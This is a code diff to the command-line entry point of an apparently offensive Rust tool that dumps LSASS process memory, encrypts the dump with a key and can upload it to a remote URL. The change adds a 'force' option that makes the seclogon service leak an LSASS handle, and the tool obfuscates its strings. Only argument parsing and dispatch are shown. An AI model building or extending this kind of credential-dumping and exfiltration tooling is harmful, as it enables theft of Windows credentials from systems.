@@ -12,7 +12,7 @@ fn main() {
 
 #[derive(Parser,Default,Debug)]
 struct Arguments {
-    /// dump or decrypt
+    /// Valid values: dump or decrypt
     action: String,
     #[clap(default_value="1234abcd",short, long)]
     /// Encryption key
@@ -24,22 +24,30 @@ struct Arguments {
     /// Destination path
     output_file: String,
     /// Upload URL
-    #[clap(default_value="http://remotehost/upload",short, long)]
-    upload: String
+    #[clap(short, long)]
+    upload: Option<String>,
+    /// Force seclogon's service to leak a lsass handle.
+    force:Option<String>
 }
 
 fn start() {
 
-    let mut args = Arguments::parse();
-
-     if args.action == "dump".to_string()
+    let args = Arguments::parse();
+    let mut force = false;
+    let mut upload = "".to_string();
+    if args.action == "dump".to_string()
     {
-        if args.upload == "http://remotehost/upload"
+        if args.upload != None
         {
-            args.upload = "".to_string();
+            upload = args.upload.unwrap();
+        }
+
+        if args.force != None
+        {
+            force = true;
         }
         
-        dumper::dump(&args.key, &args.upload);
+        dumper::dump(&args.key, &upload, force);
     }
     else if args.action == "decrypt".to_string()
     {
@@ -47,7 +55,7 @@ fn start() {
     }
     else
     {
-        println!("{}",lc!("[x] Unknown option. Use -h for detailed help."));
+        print!("{}",lc!("[x] Invalid arguments. Use -h for detailed help."));
     }
 
 }
